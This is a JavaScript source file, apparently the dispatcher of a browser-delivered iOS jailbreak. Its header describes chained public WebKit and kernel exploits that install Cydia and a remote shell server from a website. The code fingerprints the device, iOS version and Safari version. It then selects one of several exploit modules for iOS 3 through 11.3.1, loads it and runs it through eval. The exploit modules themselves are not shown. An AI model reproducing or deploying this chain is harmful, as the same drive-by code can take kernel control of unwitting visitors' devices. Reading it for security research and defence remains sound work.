/***
 *         ██╗ █████╗ ██╗██╗     ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗    ███╗   ███╗███████╗
 *         ██║██╔══██╗██║██║     ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝    ████╗ ████║██╔════╝
 *         ██║███████║██║██║     ██████╔╝██████╔╝█████╗  ███████║█████╔╝     ██╔████╔██║█████╗
 *    ██   ██║██╔══██║██║██║     ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗     ██║╚██╔╝██║██╔══╝
 *    ╚█████╔╝██║  ██║██║███████╗██████╔╝██║  ██║███████╗██║  ██║██║  ██╗    ██║ ╚═╝ ██║███████╗
 *     ╚════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝     ╚═╝╚══════╝
 *
 *    A collection of public exploits by various security researchers chained together to escallate to kernel privileges from a website, with as final payload a jailbreak including post-exploitation utillities such as the Cydia Package manager and a remote shell server.
 */

/*
     Credits:
     - Luca Todesco (Jailbreak Me with his own webkit exploit and Pangu's IOMobileFramebuffer kernel exploit)
     - Tihmstar for his 9.1 - 9.3.4 jailbreakme
     - Niklas B and Phoenhex for CVE-2018-4233 and the awesome exploit development kit and writeup
     - Ian Beer for his amazing work, writeups and full-exploits. In specific for the empty_list exploit
     - Jonathan Levin for his Jailbreak Toolkit
     - The webkit foundation for having the awesome feature of retrieving the client's GPU model through javascript
     - Apple Inc. for patching these vulnerabilities. As they are of severe impact to security of iOS devices.
 */

/*
    Contibutions:
    - Feel free to contribute to this exploit but mention all authors, they deserve that.
    - Please initialize all variables, this keeps the exploits stable
 */
module('offsets');
module('devicesupport');
module('verbosity');

var MAX_SUPPORT = {
    os: 11.31,
    safari: 604.1
};

function print_specifications() {
   var device = current_device();
   puts('<b>'+device.ProductName+'</b>');
   puts('<b>OS: </b>'+device.OSVersion);
   puts('<b>Build: </b>'+device.Build);
   puts('<b>Webkit version: </b>'+device.Browser.webkit_vers);
}

function supported_browser() {
    var device = current_device();
    return device.Browser.mobilesafari;
}

function supported_devicetype() {
    var device = current_device();
    return device.DeviceType === "iPhone" || device.DeviceType === "iPad" || device.DeviceType === "iPod";
}

function supported_osversion() {
    var device = current_device();
    return (device.OSVersion <= MAX_SUPPORT.os) && (device.Browser.safari_vers <= MAX_SUPPORT.safari);
}

function needs_offsets() {
    var device = current_device();
    return device.OSVersion >= 10;
}

function did_recognize() {
    var device = current_device();
    return (device.ProductName && device.OSVersion >= 10);
}

function osversion_between(min, max) {
    var device = current_device();
    return device.OSVersion >= min && device.OSVersion <= max;
}


function offsets_init() {
    var device = current_device();
    device.offsets = Offsets(device.OSVersion, device.ProductName);
    if(!device.offsets) {
        puts("Missing offsets for "+device.ProductName+" on "+device.OSVersion);
        device.offsets = {};
        return false;
    }
    return true;
}

function sploit_init() {
    var device  = current_device();
    
    if(!supported_browser()) {
        puts("This exploit only works on MobileSafari.");
        return false;   
    }

    if(!supported_devicetype()) {
        puts("This exploit only works on iOS devices.");
        return false;
    }

    if(!supported_osversion()) {
        puts("iOS higher than "+MAX_SUPPORT.os+" is not supported.");
        return false;
    }

    if(!did_recognize()) {
        puts("Could not recognize what device this is, are you sure this is iPhone?");
    }

    if(needs_offsets()) {
        if(!offsets_init()) {
            return false;
        }
    }

    print_specifications();

    return true;
}



//Loading modules takes time therefore this is an implementation of an async await javascript function
function start_strategy(name) {
    window.await = setInterval(function(){
        if(eval(name) !== undefined) {
            eval(name+"();");
            clearInterval(window.await);
        }
    }, 250);
}

//Based on the detected device constraints the exploit to be used can be determined.
function strategy_select() {
    var device = current_device();
    if(!device) return false;


    if(osversion_between(3.12, 4.01)) {
        puts('Chose star/saffron.');
        include('sploit.ancient');
        start_strategy('ancientgo');
        return true;
    }

    else if(osversion_between(7.1, 7.12)) {
        puts('Chose CG Gangster exploit.');
        include('sploit.71');
        start_strategy('cg7go');
        return true;
    }

    else if(osversion_between(9.0, 9.34)) {
        puts('Chose Tihmstar jbme');
        include('sploit.91x32');
        start_strategy('wk91go');
        return true;
    }

    else if(osversion_between(11.3, 11.31)) {
        var supported_devices = ["iPhone 8", "iPhone 8+", "iPhone 6S", "iPhone 6+", "iPhone 5S"];
        var supported = false;
        for(var i = 0; i < supported_devices.length && supported == false; i++) {
            supported = device.ProductName.indexOf(supported_devices[i]) > -1;
        }

        if(supported) {
            puts('Chose Niklas B\'s jailbreakme');
            include('sploit.1131');
            start_strategy('wk113go');
            return true;
        } else {
            puts('Your '+(device.ProductName ? device.ProductName.join(' or ') : 'Unknown device') + " is not supported");
            return false;
        }

    }

    return false;
}

function sploit_main() {
    try {
        if(!sploit_init()) {
            puts('Exploit initialization failed');
            return false;
        }
        var device = current_device();
        var strategy = strategy_select();

        try{ 

            if(!strategy) {
                puts("Your device or ios version isn't supported.");
                return false;
            }

        } catch(exc) {
           alert("Exploit failed: "+exc.stack);
        }
    } catch(exc) {
        alert('Exception occured: '+exc.stack);
    }

    return true;
}

